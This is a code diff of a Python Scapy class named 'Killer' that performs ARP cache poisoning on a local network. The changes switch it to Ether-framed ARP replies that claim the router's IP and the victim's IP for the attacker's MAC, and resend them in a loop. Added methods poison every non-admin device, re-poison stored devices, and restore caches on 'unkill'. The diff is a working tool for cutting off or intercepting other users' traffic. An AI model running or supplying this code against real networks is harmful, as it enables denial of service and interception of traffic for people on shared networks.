@@ -1,6 +1,6 @@
-from scapy.all import ARP, send
+from scapy.all import ARP, Ether, sendp
 from time import sleep
-
+from models.device import Device
 from tools.utils import threaded, get_default_iface
 from constants import *
 
@@ -8,83 +8,99 @@ class Killer:
     def __init__(self, router=DUMMY_ROUTER):
         self.iface = get_default_iface()
         self.router = router
-        self.killed = {}
-        self.storage = {}
-    
+        self.killed: dict[str, Device] = {}
+        self.storage: dict[str, Device] = {}
+
     @threaded
-    def kill(self, victim, wait_after=1):
+    def kill(self, victim: Device, wait_after=1):
         """
-        Spoofing victim
+        Spoofing victim - ARP poisoning
         """
         if victim.mac in self.killed:
             print(victim.mac, 'is already killed.')
             return
-        
+
         self.killed[victim.mac] = victim
 
-        # Cheat Victim
-        to_victim = ARP(
-            op=1,
-            psrc=self.router.ip,
-            hwdst=victim.mac,
-            pdst=victim.ip
+        # Get your own MAC address
+        my_mac = self.iface.mac
+
+        # Cheat Victim: Tell victim that router's IP is at YOUR MAC
+        to_victim = Ether(dst=victim.mac)/ARP(
+            op=2,                    # ARP Reply
+            psrc=self.router.ip,     # Router's IP
+            hwsrc=my_mac,           # YOUR MAC (the spoof)
+            hwdst=victim.mac,       # Victim's MAC
+            pdst=victim.ip          # Victim's IP
         )
 
-        # Cheat Router
-        to_router = ARP(
-            op=1,
-            psrc=victim.ip,
-            hwdst=self.router.mac,
-            pdst=self.router.ip
+        print('to_victim but all in string:')
+        print(to_victim.summary())
+
+        # Cheat Router: Tell router that victim's IP is at YOUR MAC
+        to_router = Ether(dst=self.router.mac)/ARP(
+            op=2,                    # ARP Reply
+            psrc=victim.ip,          # Victim's IP
+            hwsrc=my_mac,           # YOUR MAC (the spoof)
+            hwdst=self.router.mac,   # Router's MAC
+            pdst=self.router.ip     # Router's IP
         )
 
+        print('to_router but all in string:')
+        print(to_router.summary())
+        print('Interface:', self.iface.name)
         print('killed', victim.mac)
 
-        while victim.mac in self.killed \
-            and self.iface.name != 'NULL':
+        while victim.mac in self.killed and self.iface.name != 'NULL':
             # Send packets to both victim and router
-            send(to_victim, iface=self.iface.name ,verbose=0)
-            send(to_router, iface=self.iface.name ,verbose=0)
+            sendp(to_victim, iface=self.iface.name, verbose=0)
+            sendp(to_router, iface=self.iface.name, verbose=0)
+            # print('0000 ->', victim.mac, 'spoofed')
             sleep(wait_after)
 
+    @threaded
+    def unkill(self, victim: Device):
+        """
+        Unspoofing victim - Restore ARP cache to original state
+        """
+        self.killed.pop(victim.mac, None)  # Safe pop with default
+        
+        # Fix Victim: Tell victim the router's REAL MAC
+        to_victim = Ether(dst=victim.mac)/ARP(
+            op=2,                        # ARP Reply (not request)
+            psrc=self.router.ip,         # Router's IP
+            hwsrc=self.router.mac,       # Router's REAL MAC
+            hwdst=victim.mac,            # Victim's MAC
+            pdst=victim.ip               # Victim's IP
+        )
+        
+        # Fix Router: Tell router the victim's REAL MAC
+        to_router = Ether(dst=self.router.mac)/ARP(
+            op=2,                        # ARP Reply (not request)
+            psrc=victim.ip,              # Victim's IP
+            hwsrc=victim.mac,            # Victim's REAL MAC
+            hwdst=self.router.mac,       # Router's MAC
+            pdst=self.router.ip          # Router's IP
+        )
+        
+        if self.iface.name != 'NULL':
+            # Send multiple packets to ensure cache is updated
+            print(f'Restoring ARP cache for {victim.mac}')
+            for _ in range(5):  # Send 5 times for reliability
+                sendp(to_victim, iface=self.iface.name, verbose=0)
+                sendp(to_router, iface=self.iface.name, verbose=0)
+                sleep(0.1)  # Small delay between sends
+            
+            print(f'Restored ARP cache for {victim.mac}')
+        
         print('unkilled', victim.mac)
 
-    @threaded
-    def unkill(self, victim):
-        """
-        Unspoofing victim
-        """
-        self.killed.pop(victim.mac)
-
-        # Fix Victim
-        to_victim = ARP(
-            op=1,
-            psrc=self.router.ip,
-            hwsrc=self.router.mac,
-            pdst=victim.ip,
-            hwdst=victim.mac
-        )
-
-        # Fix Router
-        to_router = ARP(
-            op=1,
-            psrc=victim.ip,
-            hwsrc=victim.mac,
-            pdst=self.router.ip,
-            hwdst=self.router.mac
-        )
-
-        if self.iface.name != 'NULL':
-            # Send packets to both victim and router
-            send(to_victim, iface=self.iface.name ,verbose=0)
-            send(to_router, iface=self.iface.name ,verbose=0)
-
-    def kill_all(self, device_list):
+    def kill_all(self, device_list: list[Device], exclude_macs: set = frozenset()):
         """
         Safely kill all devices
         """
         for device in device_list[:]:
-            if device.admin:
+            if device.admin or device.mac in exclude_macs:
                 continue
             if device.mac not in self.killed:
                 self.kill(device)
@@ -95,32 +111,37 @@ class Killer:
         """
         for mac in dict(self.killed):
             self.killed.pop(mac)
-    
+            print('unkilled', mac)
+
     def store(self):
         """
         Save a copy of previously killed devices
         """
         self.storage = dict(self.killed)
-    
+
     def release(self):
         """
         Remove the stored copy of killed devices
         """
         self.storage = {}
-    
-    def rekill_stored(self, new_devices):
+
+    def rekill_stored(self, new_devices: list[Device], exclude_macs: set = frozenset()):
         """
         Re-kill old devices in self.storage
         """
-        for mac, old in self.storage.items():
+        for _, old in self.storage.items():
             for new in new_devices:
                 # Update old killed with newer ip
                 if old.mac == new.mac:
                     old.ip = new.ip
                     break
-                
+
             # Update new_devices with those it does not have
-            if old not in new_devices:
+            if all(old.mac != new.mac for new in new_devices):
+                print(f'Updating with old device: {old}')
                 new_devices.append(old)
+            
+            if old.mac in exclude_macs:
+                continue
 
             self.kill(old)
